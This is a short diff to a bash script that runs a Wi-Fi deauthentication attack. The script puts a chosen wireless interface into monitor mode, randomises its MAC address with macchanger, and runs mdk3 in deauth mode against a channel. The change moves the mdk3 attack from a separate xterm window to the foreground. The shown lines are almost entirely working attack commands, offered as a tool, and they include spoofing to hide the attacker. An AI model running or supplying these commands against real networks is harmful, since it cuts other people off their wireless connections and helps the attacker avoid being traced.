@@ -27,10 +27,10 @@ clear
 ifconfig
 echo -n -e "Choose your wireless interface: "
 read WI
-echo -e "\e[1;31mStarting the attack... If you want to stop it close the new window."
+echo -e "\e[1;31mStarting the attack... If you want to stop it press CTRL+C."
 ifconfig $WI down
 iwconfig $WI mode monitor
 macchanger -r $WI
 ifconfig $WI up
-xterm -T Deauther -e mdk3 $WI d -c $CH &&
 trap coolexit EXIT
+mdk3 $WI d -c $CH
